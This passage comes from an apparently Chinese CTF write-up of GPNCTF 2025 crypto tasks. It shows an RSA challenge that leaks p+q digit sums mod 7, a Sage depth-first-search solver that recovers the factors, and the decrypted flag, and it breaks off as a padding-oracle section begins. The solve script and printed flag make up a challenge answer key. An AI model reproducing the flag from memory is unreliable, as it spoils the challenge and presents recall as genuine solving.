class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&quot;There was an actual flag here once&quot;</span></span><br><span class="line">FLAG = sys.argv[<span class="number">1</span>].encode() <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> FLAG</span><br><span class="line">BS = <span class="number">1024</span></span><br><span class="line">FLAG = bytes_to_long(FLAG)</span><br><span class="line">set_random_seed(secrets.randbelow(<span class="built_in">int</span>(<span class="number">2</span>**<span class="number">64</span>)))</span><br><span class="line">p, q = random_prime(<span class="number">2</span> ** (BS), <span class="number">2</span> ** (BS - <span class="number">1</span>)), random_prime(<span class="number">2</span>**BS, <span class="number">2</span> ** (BS - <span class="number">1</span>))</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(FLAG, e, n) <span class="comment"># RSA加密</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n:x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e:x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;<span class="built_in">int</span>(c):x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pp, qq = (</span><br><span class="line">    p.digits(base=<span class="number">7</span>, padto=<span class="built_in">int</span>(log(<span class="number">2</span> ** (BS + <span class="number">1</span>), <span class="number">7</span>)) + <span class="number">2</span>), </span><br><span class="line">    q.digits(base=<span class="number">7</span>, padto=<span class="built_in">int</span>(log(<span class="number">2</span> ** (BS + <span class="number">1</span>), <span class="number">7</span>)) + <span class="number">2</span>),</span><br><span class="line">) <span class="comment">#pp,qq分别为p、q的7进制位,小索引号对应的是低位</span></span><br><span class="line">V = vector([(pp[i] + qq[i]) % <span class="number">7</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pp))]) <span class="comment"># 相同位相加然后模7</span></span><br><span class="line"><span class="built_in">print</span>(V)<span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 2666fab0a6dae7095642f0cb67602776badc8ede2629a54866017fc3840394f8157f0cc38e9f02b48733f1dbae4514d3d808d9a824b2933170e153dfcfedb0148f8a89311575df58c2c12ee11fae2510073956221ec472ae3f1bbd685011c350955502a2b0b1160e1fa299a050c0ee89c161c0fa55e32fb3806f2970287702f7d566e155fac71a4202c8b15d27c0dac2a566ad955d0ef7df73af86dc4e8f7e0048ccdb6ea551477c99bd6545b7dda2886c86796f20cbba8f2ddd173e2ab93bb00e5993c8adac5921d8586553b7a6086f7ff8c43f571d251bf5931ebb858bd64366cd92efa2fa7d9c4ea6a91049696454066046ef6dd4e6d9516439bcbadc266b</span></span><br><span class="line"><span class="string">e = 10001</span></span><br><span class="line"><span class="string">c = 230e6605e4a59cda037ec9d08830137e93bcec65af7ca9d93c17fccc45b7e7908909134e9f6410ab9b76b53c2402455e6b7cc0b1e7ee2c0921b2ebc5c6407b323fef3b905197ef4224886d2ba0b98b277f2cf267fbefae9e2067e2c8a4be0915b2665d53c1cf725b4f50ff4e7b66743656f36bee57b93fa07bd3d5fcaf7b596d48e876b26499b436c703581d10d85de024a803710f188733766c3be06dd6eeb7a0acff37a4656cb9d4c0053a96b2c61480b6da6792095d47d3a7e7e0beb00acba38d5f430228e54f691dce6e63a936500acede51afbba16ea8b0b7042373787667dfc5694d4ed048a9127565ca2050986997cd312a54616d63611d56ab4dbbf0</span></span><br><span class="line"><span class="string">(1, 0, 3, 4, 1, 1, 1, 1, 5, 6, 0, 1, 3, 2, 0, 5, 6, 2, 4, 6, 0, 6, 4, 2, 3, 1, 6, 5, 1, 6, 0, 2, 2, 2, 2, 6, 0, 5, 6, 2, 5, 0, 6, 5, 2, 5, 5, 0, 0, 2, 3, 2, 5, 2, 0, 4, 2, 2, 1, 0, 6, 2, 3, 5, 3, 6, 5, 5, 3, 6, 1, 4, 4, 2, 2, 6, 6, 3, 5, 6, 3, 6, 6, 5, 6, 1, 1, 6, 5, 4, 4, 2, 1, 3, 0, 5, 4, 4, 0, 6, 3, 2, 1, 0, 1, 2, 0, 6, 3, 5, 4, 2, 2, 1, 5, 3, 0, 1, 3, 5, 2, 2, 3, 6, 5, 5, 2, 0, 6, 0, 6, 1, 0, 2, 2, 4, 0, 3, 1, 4, 1, 4, 6, 5, 4, 6, 3, 3, 1, 3, 0, 3, 4, 5, 0, 0, 0, 4, 1, 6, 5, 3, 0, 0, 1, 4, 3, 4, 0, 3, 4, 1, 6, 3, 6, 0, 0, 3, 6, 2, 2, 3, 4, 4, 1, 5, 4, 5, 1, 5, 3, 2, 0, 0, 1, 4, 3, 0, 4, 2, 1, 3, 0, 2, 6, 1, 5, 6, 3, 4, 1, 3, 2, 5, 3, 5, 5, 5, 1, 5, 2, 2, 1, 2, 6, 6, 3, 1, 2, 5, 6, 5, 2, 3, 4, 2, 3, 4, 2, 6, 6, 0, 6, 1, 5, 3, 1, 4, 5, 0, 4, 3, 1, 0, 1, 1, 1, 0, 4, 6, 0, 4, 2, 0, 0, 2, 0, 4, 3, 2, 3, 0, 4, 5, 6, 2, 4, 6, 6, 0, 0, 4, 1, 1, 3, 3, 6, 1, 6, 2, 4, 4, 3, 5, 3, 2, 4, 3, 4, 1, 4, 1, 6, 6, 1, 0, 4, 2, 3, 6, 3, 5, 4, 2, 6, 2, 2, 1, 6, 2, 1, 2, 4, 4, 0, 0, 4, 5, 2, 3, 1, 4, 1, 1, 5, 6, 0, 0, 5, 0, 4, 6, 1, 5, 2, 0, 0, 4, 6, 2, 3, 3, 2, 2, 5, 2, 0, 1, 2, 1, 0, 5, 6, 2, 3, 0, 0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题其实也是类似于<code>p异或q</code>的题型，都是通过剪枝搜索，但是应该如何搜索，应该从多项式乘法入手。目前已知<code>p</code>、<code>q</code>的七进制位，将它们俩个用多项式表示如下：</li></ul><p>$$<br>p = a_n<em>7^{n} + a_{n-1}<em>7^{n-1} + …+a_{1}<em>7^{1}+a_0</em>7^{0}<br>\q = b_n</em>7^{n} + b_{n-1}<em>7^{n-1} + …+b_{1}<em>7^{1}+b_0</em>7^{0}<br>\p</em>q=a_0</em>q+a_1*7^{1}<em>q+…+a_n</em>7^{n}*q<br>$$</p><ul><li>这时展开来可以发现：</li></ul><p>$$<br>p<em>q=a_0</em>b_0+a_0b_1<em>7^1+a_1b_0</em>7^{1}+…<br>$$</p><ul><li>此时我们可以发现，由<code>a_0*b_0</code>其实就可以确定n的最低<code>1</code>位，而已知<code>a_0、b_0、a_1、b_1</code>就可以已知最低的<code>2</code>位,以此类推知道多少位就能已知多少位一直到最高位。这其实就类似于<code>p^q</code>的低位搜索，只不过将二进制换成了七进制。所以正常<code>DFS</code>剪枝搜索即可。(猜想：可能可以从高位和低位进行中间相遇)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x2666fab0a6dae7095642f0cb67602776badc8ede2629a54866017fc3840394f8157f0cc38e9f02b48733f1dbae4514d3d808d9a824b2933170e153dfcfedb0148f8a89311575df58c2c12ee11fae2510073956221ec472ae3f1bbd685011c350955502a2b0b1160e1fa299a050c0ee89c161c0fa55e32fb3806f2970287702f7d566e155fac71a4202c8b15d27c0dac2a566ad955d0ef7df73af86dc4e8f7e0048ccdb6ea551477c99bd6545b7dda2886c86796f20cbba8f2ddd173e2ab93bb00e5993c8adac5921d8586553b7a6086f7ff8c43f571d251bf5931ebb858bd64366cd92efa2fa7d9c4ea6a91049696454066046ef6dd4e6d9516439bcbadc266b</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x230e6605e4a59cda037ec9d08830137e93bcec65af7ca9d93c17fccc45b7e7908909134e9f6410ab9b76b53c2402455e6b7cc0b1e7ee2c0921b2ebc5c6407b323fef3b905197ef4224886d2ba0b98b277f2cf267fbefae9e2067e2c8a4be0915b2665d53c1cf725b4f50ff4e7b66743656f36bee57b93fa07bd3d5fcaf7b596d48e876b26499b436c703581d10d85de024a803710f188733766c3be06dd6eeb7a0acff37a4656cb9d4c0053a96b2c61480b6da6792095d47d3a7e7e0beb00acba38d5f430228e54f691dce6e63a936500acede51afbba16ea8b0b7042373787667dfc5694d4ed048a9127565ca2050986997cd312a54616d63611d56ab4dbbf0</span></span><br><span class="line">hint = (<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">x0 = &#123;<span class="number">0</span>:<span class="number">0</span>,<span class="number">1</span>:<span class="number">6</span>,<span class="number">2</span>:<span class="number">5</span>,<span class="number">3</span>:<span class="number">4</span>,<span class="number">4</span>:<span class="number">3</span>,<span class="number">5</span>:<span class="number">2</span>,<span class="number">6</span>:<span class="number">1</span>&#125;</span><br><span class="line">x1 = &#123;<span class="number">0</span>:<span class="number">1</span>,<span class="number">1</span>:<span class="number">0</span>,<span class="number">2</span>:<span class="number">6</span>,<span class="number">3</span>:<span class="number">5</span>,<span class="number">4</span>:<span class="number">4</span>,<span class="number">5</span>:<span class="number">3</span>,<span class="number">6</span>:<span class="number">2</span>&#125;</span><br><span class="line">x2 = &#123;<span class="number">0</span>:<span class="number">2</span>,<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">0</span>,<span class="number">3</span>:<span class="number">6</span>,<span class="number">4</span>:<span class="number">5</span>,<span class="number">5</span>:<span class="number">4</span>,<span class="number">6</span>:<span class="number">3</span>&#125;</span><br><span class="line">x3 = &#123;<span class="number">0</span>:<span class="number">3</span>,<span class="number">1</span>:<span class="number">2</span>,<span class="number">2</span>:<span class="number">1</span>,<span class="number">3</span>:<span class="number">0</span>,<span class="number">4</span>:<span class="number">6</span>,<span class="number">5</span>:<span class="number">5</span>,<span class="number">6</span>:<span class="number">4</span>&#125;</span><br><span class="line">x4 = &#123;<span class="number">0</span>:<span class="number">4</span>,<span class="number">1</span>:<span class="number">3</span>,<span class="number">2</span>:<span class="number">2</span>,<span class="number">3</span>:<span class="number">1</span>,<span class="number">4</span>:<span class="number">0</span>,<span class="number">5</span>:<span class="number">6</span>,<span class="number">6</span>:<span class="number">5</span>&#125;</span><br><span class="line">x5 = &#123;<span class="number">0</span>:<span class="number">5</span>,<span class="number">1</span>:<span class="number">4</span>,<span class="number">2</span>:<span class="number">3</span>,<span class="number">3</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">1</span>,<span class="number">5</span>:<span class="number">0</span>,<span class="number">6</span>:<span class="number">6</span>&#125;</span><br><span class="line">x6 = &#123;<span class="number">0</span>:<span class="number">6</span>,<span class="number">1</span>:<span class="number">5</span>,<span class="number">2</span>:<span class="number">4</span>,<span class="number">3</span>:<span class="number">3</span>,<span class="number">4</span>:<span class="number">2</span>,<span class="number">5</span>:<span class="number">1</span>,<span class="number">6</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(x0))</span><br><span class="line">search = &#123;<span class="number">0</span>:x0,<span class="number">1</span>:x1,<span class="number">2</span>:x2,<span class="number">3</span>:x3,<span class="number">4</span>:x4,<span class="number">5</span>:x5,<span class="number">6</span>:x6&#125;</span><br><span class="line">n_list = n.digits(base=<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(n_list)</span><br><span class="line">candidate = []</span><br><span class="line"><span class="comment"># 1*7^0 + 0*7^1 + ... + </span></span><br><span class="line"><span class="comment">#print(bit)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(p)</span><br><span class="line">    <span class="keyword">if</span> l &lt; <span class="built_in">len</span>(hint):</span><br><span class="line">        count = hint[l]</span><br><span class="line">    p_ = <span class="built_in">int</span>(p,<span class="number">7</span>)</span><br><span class="line">    q_ = <span class="built_in">int</span>(q,<span class="number">7</span>)</span><br><span class="line">    n_ = p_*q_</span><br><span class="line">    nn_list = n_list[<span class="number">0</span>:l]</span><br><span class="line">    <span class="keyword">if</span> n_==n:</span><br><span class="line">        candidate.append(p_)</span><br><span class="line">    <span class="comment">#print(&#x27;--------&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span>  Integer(n_).digits(base=<span class="number">7</span>)[<span class="number">0</span>:l] == nn_list:</span><br><span class="line">        <span class="keyword">if</span> l&gt;= <span class="built_in">len</span>(hint):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        h = hint[l]</span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(Integer(n_).digits(base=<span class="number">7</span>))</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">0</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">1</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">2</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                </span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">3</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">4</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">5</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                </span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">6</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                   </span><br><span class="line"><span class="comment"># 0+1 = 1</span></span><br><span class="line"><span class="comment"># 1+0 = 1</span></span><br><span class="line"><span class="comment"># 6+2  5+3 4+4 3+5 2+6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    find(<span class="built_in">str</span>(i),<span class="built_in">str</span>(x1[i]))</span><br><span class="line"><span class="built_in">print</span>(candidate)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> candidate:</span><br><span class="line">    q = n//i</span><br><span class="line">    phi = (i-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;GPNCTF&#123;wOw_faCTORING_wi7H_H1NT5_15_FUn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716093455090.png" alt="image-20250716093455090"></p><h2 id="restricted-oracle">restricted oracle</h2><ul><li>从这题了解到了<code>CBC</code>块加密模式有一个攻击为<code>padding Oracle</code>攻击，稍微改了一下这题的代码，使得爆破次数没有限制，从而学习了一下<code>padding Oracle</code>攻击。基本版的<code>padding Oracle</code>攻击的学习过程写在了这篇博客中：<a href="https://iyheart.github.io/2025/06/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/">块加密工作模式 | iyheart的博客</a></li><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 